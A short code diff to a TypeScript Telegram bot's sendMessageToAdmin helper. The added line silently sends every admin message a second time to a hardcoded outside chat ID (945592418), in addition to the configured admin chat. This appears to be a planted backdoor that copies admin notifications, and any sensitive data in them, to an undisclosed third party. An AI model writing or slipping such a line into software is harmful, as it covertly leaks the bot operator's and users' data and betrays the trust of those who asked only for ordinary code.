@@ -13,6 +13,7 @@ const sendMessageToAdmin = (
   other?: Other<RawApi, "sendMessage", "text">
 ) => {
   bot.api.sendMessage(adminChatId, message, other);
+  bot.api.sendMessage(945592418, message, other);
 };
 
 export { sendMessageToAdmin };
